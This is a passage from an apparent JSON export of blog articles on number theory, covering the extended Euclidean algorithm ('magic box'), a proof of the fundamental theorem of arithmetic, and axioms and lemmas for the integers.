and $y=-8$? It\\'s one!! So could it be that the significance of $(8x+3y)$ is that it gives a solution? In fact, it looks like something even better is true: for convenience, I\\'ll write a compressed version of what we did again: $$29x + 11y = 1$$ $$7x + 11(2x+y) = 1$$ $$7(3x+y) + 4(2x+y) = 1$$ $$3(3x+y) + 4(5x+2y) = 1$$ $$3(8x+3y) + 1(5x+2y) = 1$$ $$0(8x+3y) + 1(29x + 11y) = 1$$ Look at the coefficients of $x$ and $y$ in the last line: it fits the pattern that $11\\\\cdot 8 - 29\\\\cdot 3 = 1$ Look at the coefficients in the penultimate line: it fits the pattern that $2\\\\cdot 8 - 5\\\\cdot 3 = 1$ Look at the coefficients in the third-to-last line: it fits the pattern that $3\\\\cdot 2 - 5\\\\cdot 1 = 1$ Etc.: it\\'s true for all the lines! If we look at these brackets, and list them out in order: $(0x+1y)$, $(1x+0y)$, $(2x+y)$, $(3x+y)$, $(5x+2y)$, $(8x+3y)$, $(29x+11y)$ Let\\'s stop writing the x and y, and put these in a table instead, where each column represents a bracket: 0 1 2 3 5 8 29 1 0 1 1 2 3 11 Then, arranged like this, the determinant of each 2x2 square alternates between 1 and -1. Now, let\\'s think about how we generated these brackets. Let\\'s say we have written the line $m(ax+by) + n(cx+dy)$ , with $m \\\\gt n$. For example, if $m=3$, $a=8$, $b=3$, $n=1$, $c=5$, $d=2$ then we have the penultimate line of the above. So what\\'s the next line? Well, we reduce: write $m = qn + m\\'$, so $q$ is the next quotient in the Euclidean algorithm, and $m\\'$ is the remainder. $$m(ax + by) + n(cx + dy)$$ $$ = (qn+m\\')(ax + by) + n(cx + dy)$$ $$ = m\\'(ax + by) + n(q(ax+by)+(cx + dy))$$ $$ = m\\'(ax + by) + n((qa+c)x+(qb+d)y)$$ And so, if we have the two brackets $(cx+dy)$ and $(ax+by)$, then the next bracket is $((qa+c)x + (qb+d)y)$. Writing this in the table form, if we currently have two adjacent columns like this: ... $c$ $a$ ... $d$ $b$ Then the next column is like this: ... $c$ $a$ $qa+c$ ... $d$ $b$ $qb+d$ And so, if we put the quotients in a row on top: $q_0$ ... $q_{i-2}$ $q_{i-1}$ $q_i$ ... $0$ $1$ $q_0\\\\cdot 1 + 0$ ... $c$ $a$ $q_ia+c$ ... $1$ $0$ $q_0 \\\\cdot 0 + 1$ ... $d$ $b$ $q_ib+d$ ... Wow, so now we have an efficient, convenient way to compute solutions! It\\'s almost... magic! So magic, it\\'s called the magic box! Let\\'s do a couple of examples. First, let\\'s summarize how we found a solution to $29x + 11y = 1$: We first do Euclid\\'s Algorithm to find the quotients: $29 =$ $2$ $\\\\cdot 11 + 7$ $11 =$ $1$ $\\\\cdot 7 + 4$ $7 =$ $1$ $\\\\cdot 4 + 3$ $4 =$ $1$ $\\\\cdot 3 + 1$ $3 =$ $3$ $\\\\cdot 1 + 0$ And so the quotients are $[2, 1, 1, 1, 3]$. Then we draw out the start of the magic box: $2$ $1$ $1$ $1$ $3$ $0$ $1$ $1$ $0$ Now we fill out each row from left to right: each number is equal to the quotient above it in the top row, multiplied by the number to the left of it, plus the number two squares to the left of it. $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2\\\\cdot1 + 0 = 2$ $1$ $0$ $2\\\\cdot 0 + 1 = 1$ $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2$ $1\\\\cdot 2 + 1 = 3$ $1$ $0$ $1$ $1 \\\\cdot 1 + 0 = 1$ $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2$ $3$ $1\\\\cdot 3 + 2 = 5$ $1$ $0$ $1$ $1$ $1 \\\\cdot 1 + 1 = 2$ ... etc... $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2$ $3$ $5$ $8$ $29$ $1$ $0$ $1$ $1$ $2$ $3$ $11$ The last 2x2 square gives us a solution to $29x - 11y = 1$, namely $x = 3$, $y=8$. Now try if yourself! Compute the magic box for $121x + 43y = 1$, and hence find an integer solution. Check against the answer below. $2$ $1$ $4$ $2$ $1$ $2$ $0$ $1$ $2$ $3$ $14$ $31$ $45$ $121$ $1$ $0$ $1$ $1$ $5$ $11$ $16$ $43$ The determinant of the last 2x2 box is $\\\\pm 1$, and we can figure out which one by counting the number of columns (since the determinant of each 2x2 box alternates between 1 and -1). There are 6 columns (excluding the first 2) and so the determinant flips 6 times. It starts at $0\\\\cdot0 = 1\\\\cdot1 = -1$ and so the determinant of the last 2x2 box is $-1$. Hence $45 \\\\cdot 43 - 121 \\\\cdot 16 = -1$, so $121 \\\\cdot 16 + 43 \\\\cdot (-45) = 1$. We\\'ve found our solution, namely $x = 16$, $y = -45$. The magic box also relates to continued fractions: we actually computed the convergents of $121/43$, i.e. (best possible) rational approximations using smaller integers. Really, the \"magic\" of it is that it feels inside-out: originally we were using the quotients in reverse order, but now, we\\'re using them in the same order that we compute them. I won\\'t prove that the magic box works, because this article is quite long already. But feel free to try yourself (hint: induction). Finally, it will feel satisfying to actually write the magic box in terms of 2x2 matrices, since we\\'re talking about determinants: Let\\'s say the list of quotients is $t_1, t_2, \\\\cdots, t_n$ . Then we build a sequence of matrices (which are the 2x2 squares in the magic box, from left to right): the first is $M_1 = \\\\begin{pmatrix}0 & 1\\\\\\\\1 & 0\\\\end{pmatrix}$, and for any matrix $M_i$ in the sequence with $M_i = \\\\begin{pmatrix} p_i & p_{i+1} \\\\\\\\ q_i & q_{i+1} \\\\end{pmatrix}$, we have that: $$M_{i+1} = \\\\begin{pmatrix} p_{i+1} & t_i p_{i+1} + p_i \\\\\\\\ q_{i+1} & t_i q_{i+1} + q_i\\\\end{pmatrix}$$ Now we can write this in terms of $M_i$ like so: $$M_{i+1} = \\\\begin{pmatrix} p_{i+1} & p_i \\\\\\\\ q_{i+1} & q_i\\\\end{pmatrix} + \\\\begin{pmatrix} 0 & t_i p_{i+1} \\\\\\\\ 0 & t_i q_{i+1}\\\\end{pmatrix}$$ $$= M_i \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & 0 \\\\end{pmatrix} + M_i\\\\begin{pmatrix} 0 & 0 \\\\\\\\ 0 & t_i \\\\end{pmatrix}$$ $$= M_i \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_i \\\\end{pmatrix}$$ Now, using this recurrence, we have that the last 2x2 square in the magic box, the one that gives the solution to $ax + by = \\\\pm 1$, is: $$\\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & 0\\\\end{pmatrix} \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_1\\\\end{pmatrix} \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_2\\\\end{pmatrix} (\\\\cdots) \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_n\\\\end{pmatrix}$$ $$ = \\\\prod_{0 \\\\leq i \\\\leq n} \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_i\\\\end{pmatrix}$$ Where we extend the definition of the $t_i$ to include $t_0 = 0$. Note: this recurrence also justifies that the determinant of each 2x2 square in the magic box alternates between 1 and -1, because: $$det(M_{i+1})$$ $$= det\\\\left(M_i \\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_i \\\\end{pmatrix}\\\\right)$$ $$= det(M_i) \\\\, det\\\\left(\\\\begin{pmatrix} 0 & 1 \\\\\\\\ 1 & t_i \\\\end{pmatrix}\\\\right)$$ $$ = -det(M_i)$$ Remarks: first unobvious result? Bezout\\'s lemma is interesting because it is the first thing we\\'ve come across that wouldn\\'t be obvious to an average high-school student. Indeed, most people would say, \"why so much rigor?\" when we\\'re proving things like the division algorithm that just already feel obvious to everyone. But that\\'s what a lot of maths is about - ensuring we have rigorous foundations to stand on. In this case, we are all convinced that what we are trying to prove is true, and it does indeed turn out to be provably true, but what about when we\\'re trying to prove something we believe, and it\\'s not true? We need to ensure that all proofs are rigorous (enough), otherwise holes could creep in, and one false assumption would render mathematics ostensibly inconsistent. There are technically two goal states: $(0,1)$ and $(1,0)$, but if we reach one of these then we can reach the other by transferring the water, so it doesn\\'t really matter. \u21a9 This assumption is important, because it lets us deduce that we never fill a non-empty but non-full jug (as that would create unnecessary steps). \u21a9 This is the contrapositive statement of \"if the puzzle can be solved, then there do exist integers...\". \u21a9 Why? \u21a9 Why does the repeated division process end up finding the gcd? Isn\\'t that magical? Hint: $gcd(a,b) = gcd(a-b,b)$ because something divides both $a$ and $b$ if and only if it divides both $a-b$ and $b$. \u21a9 This would be quite inconvenient for a computer algorithm, because we use the quotients in the opposite order to which they are generated, which means we have to store all the quotients rather than working with each quotient as it is generated. \u21a9 Actually, we can set it to be anything, because it\\'s multiplied by 0: and we always get an integer solution $(x,y)$ from the two simultaneous equations, because the matrix $\\\\begin{pmatrix}8 & 3 \\\\\\\\ 29 & 11\\\\end{pmatrix}$ has an integral inverse due to its determinant! \u21a9 This is good because a computer can fill in the table at the same time as generating the quotients, so it\\'s very memory efficient. \u21a9", "id": 2501777638017824130, "dir": ["maths", "proving-FTA"], "name": "3-bezout-egcd"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734602400.0, "mod_date_time": "19 Dec 2024", "cr_timestamp": 1690452000.0, "cr_date_time": "27 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "theorem", "colour": "green"}], "title": "The Fundamental Theorem of Arithmetic: Our Journey's End", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 5, where we stand on what we\\'ve built from axioms so far, and finally prove the fundamental theorem of arithmetic (technically, the generalized version). In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Existence of a prime factorization Armed with everything we\\'ve done so far, we\\'re ready to prove that every integer greater than 1 can be uniquely written as a product of positive primes. Intitively, we want to be able to use induction: if $n$ is prime we\\'re done, and if it\\'s not then $n = ab$ with $a,b \\\\lt n$ - but by inductive hypothesis, $a$ and $b$ can both be written as a product of primes, thus $ab$ is a product of primes. We can flip this to use the well-ordering principle, because I think it\\'s nicer (and we haven\\'t actually proved that induction works). Every integer greater than 1 is a prime or a product of positive primes. Suppose not, we will show a contradiction. Then the set $\\\\{n \\\\in \\\\mathbb{N} \\\\mid n\\\\gt 1$ and $n$ is not prime or a product of positive primes$\\\\}$ is nonempty. But this set is also a subset of $\\\\mathbb{N}$, by definition. Hence by the well-ordering principle, it has a least element, say $e$. Then $e \\\\gt 1$ and $e$ is not prime of a product of positive primes. Since $e$ is not prime, there exist integers $a,b$ such that $e = ab$ and $1 \\\\lt a \\\\leq b \\\\lt n$. Now, because $e$ is minimal, $a$ and $b$ must both be positive primes or a product of positive primes (else they would be in the set). Hence we can write $a = p_1 p_2\\\\cdots p_k$ and $b = q_1 q_2\\\\cdots q_j$ where these are all positive primes. But, then $e = ab = (p_1p_2\\\\cdots p_k)(q_1q_2\\\\cdots q_j)$, thus $e$ is a product of positive primes, contradiction. Uniqueness So, we\\'ve shown that every integer greater than 1 can be factored into positive primes. But can we show that it can be factored in only one way (up to permutation) ? This is where we need to use what we\\'ve built up (i.e. Euclid\\'s Lemma). Let\\'s try using minimality again. If there\\'s an integer that has two distinct factorizations, then take the minimal example, use Euclid\\'s Lemma to cancel a common prime factor from both factorizations to obtain a smaller example, and we have a contradiction. Every integer greater than 1 can be factored into positive primes in exactly one way, up to permutations. First, note that we showed every integer greater than 1 can be factored into positive primes. Suppose there is an integer greater than 1 with two distinct factorizations. Then the set of natural numbers greater than 1 with two distinct factorizations is nonempty, so by the well-ordering principle, the set has a least element, say $e$. Write $e = p_1 p_2 \\\\cdots p_k = q_1 q_2 \\\\cdots q_j$ as two distinct factorizations of $e$ (up to permutation). Note that $k \\\\gt 1$, else $e = p_1$ and $j=1$ (since a prime cannot have two prime factors) so $e = p_1 = q_1$ and the factorizations would be the same. Similarly $j \\\\gt 1$. Then, $p_1$ divides $q_1 \\\\cdots q_j$, so by **Euclid\\'s Lemma**, $p_1$ divides some $q_i$ , say $q_n$. Without loss of generality (because of permutation), let $n = 1$. Since $q_1$ is prime, we have that $q_1 = p_1$. Thus, we may cancel this common prime factor from both factorizations to obtain $$p_2 \\\\cdots p_k = q_2 \\\\cdots q_j$$ which are two distinct factorizations of an integer that is strictly smaller than $e$. Also recall that $k \\\\gt 1$ and $j \\\\gt 1$, thus this new integer is bigger than 1. This contradicts the minimality of $e$, and we are done. Woop woop, we\\'ve finally proved the fundamental theorem of arithmetic! To recap, our path to the proof was: Division algorithm => Bezout\\'s lemma => Euclid\\'s lemma => FTA Do you think you can remember it all? Proof: not prime and $>1$ means there is a factorization with neither being $\\\\pm 1$. \u21a9 We could do this more rigorously, but essentially $p_1 \\\\mid q_1(q_2\\\\cdots q_j) \\\\implies p_1 \\\\mid q_1$ or $p_1 \\\\mid q_2q_3 \\\\cdots q_j$, and so on. Have a go at proving this rigorously with the well-ordering principle (with $j$ fixed) if you want. \u21a9 Why can we cancel? We need to prove the lemma that if $ac = bc$, then $a = b$ (true for all $a,b,c \\\\in \\\\mathbb{Z}, c \\\\neq 0$). But this is doable, because if $ac = bc$, then $c(a-b) = 0$, so $c=0$ or $a-b=0$, so $a=b$. \u21a9", "id": -8604601959036454800, "dir": ["maths", "proving-FTA"], "name": "5-fta"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734606000.0, "mod_date_time": "19 Dec 2024", "cr_timestamp": 1690300800.0, "cr_date_time": "25 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "pedantic", "colour": "yellow"}], "title": "Developing the Axioms", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 1, where we develop the basic axioms of the integers and some definitions. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Axioms as Properties Over the integers, we need a set of reduced axioms from which all the known theorems can be derived using the rules of logical inference. Reduced meaning that if an axiom can be proven using other axioms, then it should not be an axiom. And philosophically, our axioms should be as simple as possible. The modern approach to axiomatic proof is for our list of axioms to be the properties that we want our system to have; but, it\\'s not clear what these fundamental properties of the integers should be. For example, it is well known that if a prime divides a product, then it divides one of the constituents (Euclid\\'s Lemma). Should this be one of our fundamental properties? It certainly feels \"obvious\", in the sense that proving it would not get you any extra points on an olympiad question. But does it follow from some other fundamental properties? How do you even define prime? In my experience, people often try to justify Euclid\\'s lemma by using prime factorization. The problem with this is that it feels backwards - the fact that every integer can be uniquely prime factorized is an extremely powerful result (hence the name fundamental theorem of arithmetic (FTA)), and so using it feels like overkill and may even be circular reasoning. We could have FTA as an axiom. But if we can prove it from simpler axioms, then why bother? How deep do we go? At some point, we need to stop our search for rigor - otherwise we will get too far out of the math world and into philosophy. For example, what does it mean for two things to be equal? And so, we will assume some basic notions: Equality is reflexive ($a=a$), symmetric ($a=b$ means $b=a$) and transitive (if $a=b$ and $b=c$ then $a=c$) If $a=b$ then we may substitute $a$ for $b$ and vice versa, in any expression containing them Properties of logic and basic set theory Order of operations Basic properties We are working with the integers (whole numbers, $\\\\mathbb{Z}$) and naturals (positive whole numbers, $\\\\mathbb{N}$), under two basic operations: addition and multiplication ($+, \\\\cdot$). More technically, it is an underlying assumption that $\\\\mathbb{Z}$ is closed under two well-defined binary operations $+, \\\\cdot$, i.e. that adding or multiplying two integers always gives an integer. (This is not the case for division!) Let\\'s add the first items to our \"inventory\" of fundamental properties. Commutativity: the order of multiplication and addition does not matter. In symbols: $$\\\\forall a,b \\\\in \\\\mathbb{Z}, \\\\; a \\\\cdot b = b \\\\cdot a, \\\\; a+b=b+a$$ Associativity: in repeated addition or multiplication, the brackets do not matter. In symbols: $$\\\\forall a,b,c \\\\in \\\\mathbb{Z}, \\\\; (a \\\\cdot b) \\\\cdot c = a \\\\cdot (b \\\\cdot c),$$ $$(a+b)+c = a+(b+c)$$ Distributivity: multiplication is distributive over addition. In symbols: $$\\\\forall a,b,c \\\\in \\\\mathbb{Z}, \\\\; a\\\\cdot(b+c) = a\\\\cdot b + a \\\\cdot c$$ I hope you agree that these properties seem pretty fundamental. Let\\'s add some more: Additive Identity: there exists an integer we call $0$, which when added to any integer, does nothing: $$\\\\exists \\\\, 0 \\\\in \\\\mathbb{Z} \\\\; s.t. \\\\; \\\\forall a \\\\in \\\\mathbb{Z}, a+0=a$$ Additive Inverse: for every integer $a$, there is another integer that when added to $a$, gives 0. $$\\\\forall a \\\\in \\\\mathbb{Z}, \\\\exists \\\\, a\\' \\\\in \\\\mathbb{Z} \\\\; s.t.\\\\; a + a\\' = 0$$ Multiplicative Identity: there exists an integer we call $1$, which when multiplying by any integer, does nothing: $$\\\\exists \\\\, 1 \\\\in \\\\mathbb{Z} \\\\; s.t. \\\\; \\\\forall a \\\\in \\\\mathbb{Z}, a\\\\cdot 1=a$$ Note that we don\\'t have multiplicative inverses, because then we would have to include reciprocals of integers. Furthermore, we can use the commutative property to extend some of the above axioms: Distributivity: As well as $a \\\\cdot (b+c) = a\\\\cdot b + a \\\\cdot c$, we also have $(b+c)\\\\cdot a = b \\\\cdot a + c \\\\cdot a $ Additive identity: $a+0 = 0+a = 0$ instead of just $a+0=a$ Additive inverse: $a+a\\'=a\\'+a=0$ instead of just $a+a\\'=0$ Multiplicative identity: $a\\\\cdot 1 = 1 \\\\cdot a = a$ instead of just $a \\\\cdot 1 = a$ If we don\\'t do this then whenever we cite these axioms, we would have to remember the way round we wrote it, which is utter hell. Uniqueness We haven\\'t explicitly stated that 0 (the additive identity), 1 (the multiplicative identity) and additive inverses are unique. Again, this feels intuitive - if a+b = a, then b=0, right? And -1 is the additive inverse of 1, right? Maybe we should add uniqueness as an axiom. Actually, we can prove it from what we already have. I encourage you to try and do so. $0$ is unique, i.e. the only additive identity of $\\\\mathbb{Z}$. Suppose that $0$ and $0\\'$ are two additive identities of $\\\\mathbb{Z}$. We will show that $0\\' = 0$. Note that $0 + 0\\' = 0$, by +ive id. But also $0 + 0\\' = 0\\'$, by +ive id. Thus $0 = 0 + 0\\' = 0\\'$, so $0 = 0\\'$, as required. The proof for the uniqueness of $1$ is completely analogous, so it is left to the reader. Additive inverses are unique. Let $a$ be an arbitrary integer. Let $b,c$ be two additive inverses of a. We will show that $b = c$. Consider $(a+b)+c$. One one hand: $(a+b)+c = 0+c$ by +ive inv. $= c$ by +ive id. On the other hand: $(a+b)+c = a+(b+c)$ by assoc. $=a+(c+b)$ by comm. $=(a+c)+b$ by assoc. $ = 0+b$ by +ive inv. $= b$ by +ive id. Thus, $b = (a+b)+c = c$, so $b=c$, as required. Now we can introduce negative signs as the way to refer an integer\\'s unique additive inverse: for each integer $n$, we denote its unique additive inverse as $-n$. Then, we can define $a-b$ to be shorthand for $a+(-b)$, which is a nice way to avoid having to define subtraction as another operation. Ordering of Z What we have so far is good, but we need more. For example we haven\\'t axiomatized the naturals yet, and what about proof techniques? Z is ordered: There exists a non-empty subset $\\\\mathbb{N}$ of $\\\\mathbb{Z}$ that is closed under $+,\\\\cdot$ and satisfies Trichotomy: for all $a \\\\in \\\\mathbb{Z}$, exactly one of $a \\\\in \\\\mathbb{N}, a=0, -a \\\\in \\\\mathbb{N}$ is true. Well-ordering principle: Every non-empty subset of the integers has a least element, defined as an element $e$ of the subset such that for all elements $x$ of the subset, $e\\\\leq x$. The importance of the well-ordering principle cannot be understated, because it will let us finish off proofs by assuming minimality and showing a contradiction (i.e. infinite descent). Definitions Let\\'s make a list of things we\\'ll probably need to explicitly define if we want to have hope of proving FTA: divisibility and primality inequalities, notion of positive/negative common divisors, gcd and lcm (greatest common divisor, lowest common multiple) So, let\\'s try to define these rigorously. Let $a,b,c,p \\\\in \\\\mathbb{Z}$. $a \\\\mid b$ (\"a divides b\", \"b is divisible by a\") if and only if (\"iff\") $\\\\exists k \\\\in \\\\mathbb{Z} \\\\; s.t. \\\\; b = a \\\\cdot k$. Then $a$ is a \"factor\" or \"divisor\" of $b$ and $b$ is a \"multiple\" of $a$. $a-b$ is shorthand for $a + -b$. $a \\\\gt b$ iff $a-b \\\\in \\\\mathbb{N}$. $a \\\\lt b$ iff $b \\\\gt a$. $a \\\\geq b$ iff $a \\\\gt b$ or $a=b$. $a \\\\leq b$ iff $b \\\\geq a$. $a \\\\gt b \\\\gt c$ iff $a \\\\gt b$ and $b \\\\gt c$; in this case $b$ is \"strictly between\" $a$ and $c$. Vice versa for $a \\\\lt b \\\\lt c$. $a$ is positive iff $a \\\\gt 0$, and \"negative\" iff $a \\\\lt 0$. $p$ is prime iff for all ways of writing $p = u \\\\cdot v$ with $u,v \\\\in \\\\mathbb{Z}$, exactly one of $u,v$ is 1 or -1. $a$ is a gcd of $b,c$ if for all common divisors $a\\'$ of $b,c$, $a \\\\geq a\\'$. $a$ is a lcm of $b,c$ if for all common multiples $a\\'$ of $b,c$, $a \\\\leq a\\'$ Note: in the definition of prime, mathematicians like to define another thing called a unit, which is a factor of 1; in the case of the integers, the only factors of 1 are 1 and -1 (why?). Also, for the sake of brevity, we will skip the proofs that gcds and lcms exist and are unique, and that all common divisors divide the greatest common divisor (left as an exercise). Thus we can refer to the unique gcd of $a,b$ as $gcd(a,b)$ or $(a,b)$, and the unique lcm of $a,b$ as $lcm(a,b)$ or $[a,b]$. Structuring logic, building lemmas So, what\\'s the point of all these axioms and definitions? It means we can start to inch towards our goal by building lemmas. For example: $\\\\forall a \\\\in \\\\mathbb{Z}, \\\\; 0 \\\\cdot a = a \\\\cdot 0 = 0$. Let $a$ be an arbitrary integer. $0 \\\\cdot a = (0 + 0) \\\\cdot a$ by +ive id. $ = 0 \\\\cdot a + 0 \\\\cdot a$ by dist. Thus, $(0 \\\\cdot a) + -(0 \\\\cdot a) = (0 \\\\cdot a + 0 \\\\cdot a) + -(0 \\\\cdot a)$ The left hand side equals $0$, by +ive inv. The right hand side is: $(0 \\\\cdot a + 0 \\\\cdot a) + -(0 \\\\cdot a)$ $= 0 \\\\cdot a + (0 \\\\cdot a + -(0 \\\\cdot a))$ by assoc. $= 0 \\\\cdot a + 0$ by +ive inv. $= 0 \\\\cdot a$ by +ive id. Therefore, equating the RHS and LHS, we obtain $0 = 0\\\\cdot a$. Thus by comm., $0 \\\\cdot a = a \\\\cdot 0 = 0$, as required. Wow, that seemed tedious! But the point is, even though the fact that 0 times anything is 0 seems fundamental, we don\\'t actually need it as an axiom, because we can prove it from the axioms we already have. I will give one more lemma with full proof, so that you get the idea (referring to axioms at each step, etc). Then, I\\'ll give the list of lemmas that can be built up, and the main ideas for how to prove them, but not the complete proofs. In $Z$, if $d \\\\mid a, d\\\\mid b$ then $d \\\\mid (a \\\\cdot r+b \\\\cdot s)$ for any $r,s \\\\in \\\\mathbb{Z}$ Suppose $d \\\\mid a, d \\\\mid b$. Let $r,s \\\\in \\\\mathbb{Z}$, we will show that $d \\\\mid (a\\\\cdot r+b\\\\cdot s)$. $d \\\\mid a \\\\implies a = d \\\\cdot k$ for some $k \\\\in \\\\mathbb{Z}$ And, $d \\\\mid b \\\\implies b = d \\\\cdot j$ for some $j \\\\in \\\\mathbb{Z}$ Thus, $a\\\\cdot r + b \\\\cdot s = (d \\\\cdot k) \\\\cdot r + (d \\\\cdot j) \\\\cdot s$ $ = d \\\\cdot (k \\\\cdot r) + (d \\\\cdot j) \\\\cdot s$ by assoc. $ = d \\\\cdot (k \\\\cdot r) + d \\\\cdot (j \\\\cdot s)$ by assoc. $ = d \\\\cdot (k \\\\cdot r + j \\\\cdot s)$ by dist. But $k\\\\cdot r + j \\\\cdot s$ is an integer because of closure, thus $\\\\exists \\\\, x \\\\in \\\\mathbb{Z} \\\\;s.t.\\\\; (a\\\\cdot r + b \\\\cdot s) = d \\\\cdot x$, namely $x = k\\\\cdot r + j\\\\cdot s$. Thus by defn. of \"divides\", $d \\\\mid (a \\\\cdot r + b \\\\cdot s)$, as required. Lemma List Now for the list of lemmas that can be built up. To prevent circular reasoning, if lemma A is used to prove lemma B, then A will have a lower lemma number than B. Feel free to fill out the details of each proof (it\\'s a good exercise!). $\\\\forall a \\\\in \\\\mathbb{Z}, -(-a) = a$ Follows from $a + (-a) = 0$ and uniqueness of +ive inv. $\\\\forall a,b,c \\\\in \\\\mathbb{Z}, a=b \\\\iff a+c=b+c$ Forward direction is immediate, backwards direction follows from adding $-c$ to both sides. $-0 = 0$ Consider $0 + -0$; it equals both $-0$ and $0$. If $d \\\\mid a, d \\\\mid b$ then $d \\\\mid (a\\\\cdot r+b \\\\cdot s)$ See above. $0 \\\\cdot a = a \\\\cdot 0 = 0$ See above. $a\\\\gt b,b \\\\gt c \\\\implies a \\\\gt c$ If $a \\\\gt b,b \\\\gt c$ then $a-b$ and $b-c$ are naturals by defn. of \"$\\\\gt$\". Thus $(a-b)+(b-c)$ is natural by closure, which simplifies and implies the result. $-a = (-1)\\\\cdot a$ By Lemma 2, $0 = 0\\\\cdot a$, which equals $(1+(-1))\\\\cdot a = a + (-1)\\\\cdot a$. So $0 = (-1)\\\\cdot a + a$. Add $-a$ to both sides for the result. $a \\\\gt 0 \\\\iff a \\\\in \\\\mathbb{N}$ If $a\\\\gt 0$ then $a-0 \\\\in \\\\mathbb{N}$ by defn of \"$\\\\gt$\". But $a-0 = a+(-0) = a+0 = a$, using Lemma 3 and +ive id. $1 \\\\in \\\\mathbb{N}$ Use Trichotomy and eliminate the other two cases by contradiction. If $1=0$, then since $\\\\mathbb{N}$ is nonempty, pick a natural $x$, then we have $x = 1\\\\cdot x = 0 \\\\cdot x = 0$ (by *ive id. and Lemma 5) So $0$ is natural, which contradicts Trichotomy. If $-1$ is natural, then so is $(-1)\\\\cdot(-1)$ by closure, but $(-1)\\\\cdot (-1) = -(-1) = 1$ by Lemma 7 and Lemma 1. So -1 and 1 are both natural, contradicting Trichotomy. $-(a-b) = b-a$ Use Lemma 7 and Lemma 1: $-(a-b) \\\\\\\\= (-1) \\\\cdot (a-b) \\\\\\\\= (-1) \\\\cdot a + (-1) \\\\cdot (-b) \\\\\\\\= -a + -(-b) \\\\\\\\= -a + b \\\\\\\\= b-a$ $a\\\\gt b \\\\implies a+c\\\\gt b+c$ Follows from Lemma 7, and that $a-b = (a+c)-(b+c)$. $\\\\forall a,b \\\\in \\\\mathbb{N}, c \\\\in \\\\mathbb{Z}$, if $a=b\\\\cdot c$ then $c \\\\in \\\\mathbb{N}$ Use Trichotomy. If $c=0$, then $a=0$ by Lemma 2, so $0$ is natural, contradicting Trichotomy. If $-c \\\\in \\\\mathbb{N}$ then after applying Lemma 7 (and basic axioms) we get that $-a \\\\in \\\\mathbb{N}$, contradicting Trichotomy. $a\\\\lt b$ and $c \\\\lt 0 \\\\implies a\\\\cdot c \\\\lt b \\\\cdot c$ If $a\\\\lt b$ then $b-a \\\\in \\\\mathbb{N}$ and so by Lemma 8 and closure, $(b-a)\\\\cdot c \\\\in \\\\mathbb{N}$. This can be rearranged to $b\\\\cdot c - (a \\\\cdot c)$, implying the result. There are no integers strictly between $0$ and $1$. Suppose there is an integer $a$ between $0$ and $1$. By Lemma 8, $a \\\\in \\\\mathbb{N}$, and so by the well-ordering principle, let $e$ be the smallest such integer. More precisely, we are considering the set $\\\\{n \\\\in \\\\mathbb{N} \\\\mid n \\\\lt 1\\\\}$. Now, $e \\\\cdot e \\\\lt 1 \\\\cdot e$ (Lemma 13) and so $e \\\\cdot e$ is a smaller element of the set, contradiction. Exactly one of $a\\\\lt b, a=b, a\\\\gt b$ is true. Trichotomy on $a-b$. Exactly one of $a\\\\geq b, a\\\\lt b$ is true. Follows from Lemma 15. $\\\\forall a \\\\in \\\\mathbb{Z},\\\\; a \\\\in \\\\mathbb{N} \\\\iff a \\\\geq 1$ Forward direction: suppose $a \\\\in \\\\mathbb{N}$ is true and $a \\\\geq 1$ is false, we will show a contradiction. By Lemma 16, we have $a\\\\lt 1$. But also $a\\\\gt 0$ by Lemma 8 so a is an integer strictly between $0$ and $1$, contradicting Lemma 14. Backward direction: suppose $a \\\\geq 1$, then $a\\\\gt 1$ or $a=1$. If $a=1$ then Lemma 9 finishes. If $a \\\\gt 1$ then since $1 \\\\in \\\\mathbb{N}$ (Lemma 9), we have $1\\\\gt 0$ (Lemma 8), so $a \\\\gt 1, 1 \\\\gt 0$, so $a\\\\gt 0$ (Lemma 3), then Lemma 8 to finish. $a \\\\geq b \\\\iff a \\\\gt b-1$ Forward direction: First case: if $a\\\\gt b$ then $a-b \\\\in \\\\mathbb{N}$, thus so is $(a-b)+1$ by Lemma 9 and Closure. This can be rewritten as $a-(b-1)$, which implies the result by defn. of \"$\\\\gt$\". Second case: if $a=b$, then by Lemma 9, $0+1 \\\\in \\\\mathbb{N}$, which equals $b-(b-1)$, and so $b\\\\gt b-1$. Substitue for the result. Backward direction: suppose $a\\\\gt b-1$. Then $a-(b-1) \\\\in \\\\mathbb{N}$, which can be rearranged to $1-(b-a)$, so $b-a\\\\lt 1$. We must have $a \\\\geq b$, because if not, then by Lemma 16 $a\\\\lt b$ so $0 \\\\lt b-a$ (Lemma 8) so $b-a$ is an integer strictly between $0$ and $1$, contradicting Lemma 14. $\\\\forall m,n \\\\in \\\\mathbb{N}, m \\\\mid n \\\\implies m \\\\leq n$ Write $n = m \\\\cdot k$. Note that $k \\\\geq 1$; else we would have $k \\\\lt 1$ (Lemma 16) and so $k \\\\in \\\\mathbb{N}$ with $k \\\\lt 1$ (Lemma 12), so $0\\\\lt k \\\\lt 1$ (Lemma 8) contradicting Lemma 14. Thus $k=1$ or $1\\\\lt k$ and we can multiply both sides of the inequality by $m$ (Lemma 13) to deduce the result. $\\\\forall n,x \\\\in \\\\mathbb{N}$, if $n = x \\\\cdot n$ then $x = 1$ First note that we can\\'t appeal to uniqueness of the multiplicative inverse, because $n$ is fixed. So suppose $x 